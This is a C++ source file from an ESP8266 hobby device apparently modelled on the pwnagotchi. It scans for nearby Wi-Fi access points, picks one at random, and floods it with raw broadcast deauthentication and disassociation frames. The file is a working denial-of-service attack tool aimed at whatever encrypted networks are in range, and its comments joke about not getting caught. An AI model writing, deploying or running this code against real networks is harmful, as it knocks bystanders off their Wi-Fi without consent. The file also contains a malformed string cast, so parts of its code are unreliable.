/**
 * deauth.cpp: handles the deauth of a local AP
 */

#include "deauth.h"

/** developer note:
 *
 * the deauth frame is defined here.
 * this is a raw frame(layer 2)
 * man i hate networking
 *
 */

// default values before we start
bool Deauth::running = false;
std::vector<String> Deauth::whitelist = {};
String Deauth::randomAP = "";
int Deauth::randomIndex;

/** developer note:
 *
 * instead of using the deauth frame normally, we append information to the
 * deauth frame and dynamically write info to the frame
 *
 */

uint8_t Deauth::deauthTemp[26] = {
    /*  0 - 1  */ 0xC0, 0x00, // Type, subtype: c0 => deauth, a0 => disassociate
    /*  2 - 3  */ 0x00, 0x00, // Duration (handled by the SDK)
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Reciever MAC (To)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source MAC (From)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID MAC (From)
    /* 22 - 23 */ 0x00, 0x00, // Fragment & squence number
    /* 24 - 25 */ 0x01, 0x00 // Reason code (1 = unspecified reason)
};

uint8_t Deauth::deauthFrame[26];
uint8_t Deauth::disassociateFrame[26];
uint8_t Deauth::broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

/**
 * Adds SSIDs (or BSSIDs) to the whitelist
 * @param bssids SSIDs/BSSIDs to whitelist
 */
void Deauth::add(const std::string &bssids) {
    std::stringstream ss(bssids);
    std::string token;

    // seperate info and whitelist
    while (std::getline(ss, token, ',')) {
        // trim out whitespace
        token.erase(0, token.find_first_not_of(" \t\r\n"));
        token.erase(token.find_last_not_of(" \t\r\n") + 1);

        // add to whitelist
        Serial.print("('-') Adding ");
        Serial.print(token.c_str());
        Serial.println(" to the whitelist");
        Display::updateDisplay("('-')", "Adding " + (String) + " to the whitelist");
        whitelist.push_back(token.c_str());
    }
}

/**
 * Adds everything to the whitelist
 */
void Deauth::list() {
    for (const auto &bssid : Config::whitelist) {
        Deauth::add(bssid);
    }
}

/**
 * Sends a packet
 * @param buf Packet to send
 * @param len Length of packet
 * @param sys_seq Ignore this, just make it false
 */
bool Deauth::send(uint8_t *buf, uint16_t len, bool sys_seq) {
    // apparently will not work with 0 on regular, fixed on spacehuhn
    bool sent = wifi_send_pkt_freedom(buf, len, sys_seq) == 0;
    delay(102);

    return sent;
}

/**
 * Check if packet source address is a broadcast
 * source: https://github.com/SpacehuhnTech/esp8266_deauther/blob/v2/esp8266_deauther/functions.h#L334
 * @param mac Mac address to check
 */
bool Deauth::broadcast(uint8_t *mac) {
    for (uint8_t i = 0; i < 6; i++) {
        if (mac[i] != broadcastAddr[i])
            return false;
    }

    return true;
}

/**
 * Format Mac Address as a String, then print it
 * @param mac Address to print
 */
void Deauth::printMac(uint8_t *mac) {
    String macStr = printMacStr(mac);
    Serial.println(macStr);
    Display::updateDisplay("('-')", "AP BSSID: " + macStr);
}

/**
 * Checks if a network is hidden
 * Instead of having an integer being
 * returned from WiFi.isHidden(),
 * we make a string out of it and return it here.
 * Sadly the ESP32 doesn't support this for some reason.
 * @param network Network to check from index
 */
String Deauth::printHidden(int network) {
    String hidden;
    bool check = WiFi.isHidden(network);

    if (check == 0) {
        hidden = "False";
    } else {
        hidden = "True";
    }

    return hidden;
}

/**
 * Function meant to print Mac as a String used in printMac()
 * @param mac Mac to use
 */
String Deauth::printMacStr(uint8_t *mac) {
    char buf[18]; // 17 for MAC, 1 for null terminator
    snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1],
             mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

/**
 * Selects an AP to deauth, returns a boolean based on if the scan and selection was successful
 */
bool Deauth::select() {
    // reset values
    Deauth::randomAP = "";
    Deauth::randomIndex = -1;

    Parasite::sendDeauthStatus(START_SCAN);

    // cool animation, skip if parasite mode
    if (!Config::parasite) {
        for (int i = 0; i < 5; ++i) {
            Serial.println("(0-o) Scanning for APs.");
            Display::updateDisplay("(0-o)", "Scanning  for APs.");
            delay(Config::shortDelay);
            Serial.println("(o-0) Scanning for APs..");
            Display::updateDisplay("(o-0)", "Scanning  for APs..");
            delay(Config::shortDelay);
            Serial.println("(0-o) Scanning for APs...");
            Display::updateDisplay("(0-o)", "Scanning  for APs...");
            delay(Config::shortDelay);
            Serial.println(" ");
            delay(Config::shortDelay);
        }
        delay(Config::longDelay);
    }

    // stop and scan
    Minigotchi::monStop();

    int apCount = 0;
    // If a parasite channel is set, then we want to focus on that channel
    // Otherwise go off on our own and scan for whatever is out there
    if (Parasite::channel > 0) {
        apCount = WiFi.scanNetworks(false, false, Parasite::channel);
    } else {
        apCount = WiFi.scanNetworks();
    }

    if (apCount > 0 && Deauth::randomIndex == -1) {
        Deauth::randomIndex = random(apCount);
        Deauth::randomAP = WiFi.SSID(Deauth::randomIndex);
        uint8_t encType = WiFi.encryptionType(Deauth::randomIndex);

        Serial.print("('-') Selected random AP: ");
        Serial.println(randomAP.c_str());
        Serial.println(" ");
        Display::updateDisplay("('-')", "Selected random AP: " + randomAP);
        delay(Config::shortDelay);

        if (encType == -1 || encType == ENC_TYPE_NONE) {
            Serial.println(
                "('-') Selected AP is not encrypted. Skipping deauthentication...");
            Display::updateDisplay(
                "('-')",
                "Selected AP is not encrypted. Skipping deauthentication...");
            Parasite::sendDeauthStatus(SKIPPING_UNENCRYPTED);
            return false;
        }

        // check for ap in whitelist
        if (std::find(whitelist.begin(), whitelist.end(), randomAP) !=
                whitelist.end()) {
            Serial.println("('-') Selected AP is in the whitelist. Skipping "
                           "deauthentication...");
            Display::updateDisplay(
                "('-')",
                "Selected AP is in the whitelist. Skipping deauthentication...");
            Parasite::sendDeauthStatus(SKIPPING_WHITELIST);
            return false;
        }

        /** developer note:
         *
         * here we will create the deauth frame using the header,
         * as we find the AP in question we also generate the required information
         * for it as well...
         *
         */

        // clear out exisitng frame...
        std::fill(std::begin(Deauth::deauthFrame), std::end(Deauth::deauthFrame),
                  0);
        std::fill(std::begin(Deauth::disassociateFrame),
                  std::end(Deauth::disassociateFrame), 0);

        // copy template
        std::copy(Deauth::deauthTemp,
                  Deauth::deauthTemp + sizeof(Deauth::deauthTemp),
                  Deauth::deauthFrame);
        std::copy(Deauth::deauthTemp,
                  Deauth::deauthTemp + sizeof(Deauth::deauthTemp),
                  Deauth::disassociateFrame);

        Deauth::deauthFrame[0] = 0xC0; // type
        Deauth::deauthFrame[1] = 0x00; // subtype
        Deauth::deauthFrame[2] = 0x00; // duration (SDK takes care of that)
        Deauth::deauthFrame[3] = 0x00; // duration (SDK takes care of that)

        Deauth::disassociateFrame[0] = 0xA0; // type
        Deauth::disassociateFrame[1] = 0x00; // subtype
        Deauth::disassociateFrame[2] = 0x00; // duration (SDK takes care of that)
        Deauth::disassociateFrame[3] = 0x00; // duration (SDK takes care of that)

        // bssid
        uint8_t *apBssid = WiFi.BSSID(Deauth::randomIndex);

        /** developer note:
         *
         * addr1: reciever addr
         * addr2: sender addr
         * addr3: filtering addr
         *
         */

        // copy our mac(s) to header
        std::copy(Deauth::broadcastAddr,
                  Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
                  Deauth::deauthFrame + 4);
        std::copy(apBssid, apBssid + 6, Deauth::deauthFrame + 10);
        std::copy(apBssid, apBssid + 6, Deauth::deauthFrame + 16);

        std::copy(Deauth::broadcastAddr,
                  Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
                  Deauth::disassociateFrame + 4);
        std::copy(apBssid, apBssid + 6, Deauth::disassociateFrame + 10);
        std::copy(apBssid, apBssid + 6, Deauth::disassociateFrame + 16);

        Serial.print("('-') Full AP SSID: ");
        Serial.println(WiFi.SSID(Deauth::randomIndex));
        Display::updateDisplay("('-')",
                               "Full AP SSID: " + WiFi.SSID(Deauth::randomIndex));

        Serial.print("('-') AP Encryption: ");
        Serial.println(WiFi.encryptionType(Deauth::randomIndex));
        Display::updateDisplay(
            "('-')",
            "AP Encryption: " + (String)WiFi.encryptionType(Deauth::randomIndex));

        Serial.print("('-') AP RSSI: ");
        Serial.println(WiFi.RSSI(Deauth::randomIndex));
        Display::updateDisplay("('-')", "AP RSSI: " +
                               (String)WiFi.RSSI(Deauth::randomIndex));

        Serial.print("('-') AP BSSID: ");
        printMac(apBssid);

        Serial.print("('-') AP Channel: ");
        Serial.println(WiFi.channel(Deauth::randomIndex));
        Display::updateDisplay(
            "('-')", "AP Channel: " + (String)WiFi.channel(Deauth::randomIndex));

        Serial.print("('-') AP Hidden?: ");
        Serial.println(Deauth::printHidden(Deauth::randomIndex));
        Display::updateDisplay(
            "('-')", "AP Hidden?: " + Deauth::printHidden(Deauth::randomIndex));
        Serial.println(" ");
        delay(Config::longDelay);

        Parasite::sendDeauthStatus(PICKED_AP, Deauth::randomAP.c_str(),
                                   WiFi.channel(Deauth::randomIndex));

        return true;
    } else if (apCount < 0) {
        Serial.println("(;-;) I don't know what you did, but you screwed up!");
        Serial.println(" ");
        Display::updateDisplay("(;-;)", "You screwed up somehow!");

        Parasite::sendDeauthStatus(DEAUTH_SCAN_ERROR);

        delay(Config::shortDelay);
    } else {
        // well ur fucked.
        Serial.println("(;-;) No access points found.");
        Serial.println(" ");
        Display::updateDisplay("(;-;)", "No access points found.");

        Parasite::sendDeauthStatus(NO_APS);

        delay(Config::shortDelay);
    }
    return false;
}

/**
 * Full deauthentication attack
 */
void Deauth::deauth() {
    if (Config::deauth) {
        // select AP
        if (Deauth::select()) {
            if (randomAP.length() > 0) {
                Serial.println(
                    "(>-<) Starting deauthentication attack on the selected AP...");
                Serial.println(" ");
                Display::updateDisplay("(>-<)", "Begin deauth-attack on AP...");
                delay(Config::shortDelay);
                // define the attack
                if (!running) {
                    start();
                } else {
                    Serial.println("('-') Attack is already running.");
                    Serial.println(" ");
                    Display::updateDisplay("('-')", "Attack is already running.");
                    delay(Config::shortDelay);
                }
            } else {
                // ok why did you modify the deauth function? i literally told you to
                // not do that...
                Serial.println("(X-X) No access point selected. Use select() first.");
                Serial.println("('-') Told you so!");
                Serial.println(" ");
                Display::updateDisplay("(X-X)",
                                       "No access point selected. Use select() first.");
                delay(Config::shortDelay);
                Display::updateDisplay("('-')", "Told you so!");
                delay(Config::shortDelay);
                return;
            }
        }
    } else {
        // do nothing if deauthing is disabled
    }
}

/**
 * Starts deauth attack
 */
void Deauth::start() {
    running = true;
    int deauthFrameSize = sizeof(deauthFrame);
    int disassociateFrameSize = sizeof(disassociateFrame);
    int packets = 0;
    unsigned long startTime = millis();

    // packet calculation
    int basePacketCount = 150;
    int rssi = WiFi.RSSI(Deauth::randomIndex);
    int numDevices = WiFi.softAPgetStationNum();

    int packetCount = basePacketCount + (numDevices * 10);
    if (rssi > -50) {
        packetCount /= 2; // strong signal
    } else if (rssi < -80) {
        packetCount *= 2; // weak signal
    }

    Parasite::sendDeauthStatus(START_DEAUTH, Deauth::randomAP.c_str(),
                               WiFi.channel(Deauth::randomIndex));

    // send the deauth 150 times(ur cooked if they find out)
    for (int i = 0; i < packetCount; ++i) {
        if (Deauth::send(deauthFrame, deauthFrameSize, 0) &&
                Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
            packets++;
            float pps = packets / (float)(millis() - startTime) * 1000;

            // show pps
            if (!isinf(pps)) {
                Serial.print("(>-<) Packets per second: ");
                Serial.print(pps);
                Serial.print(" pkt/s");
                Serial.println(" (AP:" + randomAP + ")");
                Display::updateDisplay("(>-<)", "Packets per second: " + (String)pps +
                                       " pkt/s" + "(AP:" + randomAP + ")");
            }
        } else if (!Deauth::send(deauthFrame, deauthFrameSize, 0) &&
                   !Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
            Serial.println("(X-X) Both packets failed to send!");
            Display::updateDisplay("(X-X)", "Both packets failed to send!");
        } else if (!Deauth::send(deauthFrame, deauthFrameSize, 0) &&
                   Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
            Serial.println("(X-X) Deauthentication failed to send!");
            Display::updateDisplay("(X-X)", "Deauth failed to send!");
        } else if (Deauth::send(deauthFrame, deauthFrameSize, 0) &&
                   !Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
            Serial.println("(X-X) Disassociation failed to send!");
            Display::updateDisplay("(X-X)", "Disassoc failed to send!");
        } else {
            Serial.println("(X-X) Unable to calculate pkt/s!");
            Display::updateDisplay("(X-X)", "Unable to calculate pkt/s!");
        }
    }

    Serial.println(" ");
    Serial.println("(^-^) Attack finished!");
    Serial.println(" ");
    Display::updateDisplay("(^-^)", "Attack finished!");
    running = false;
}
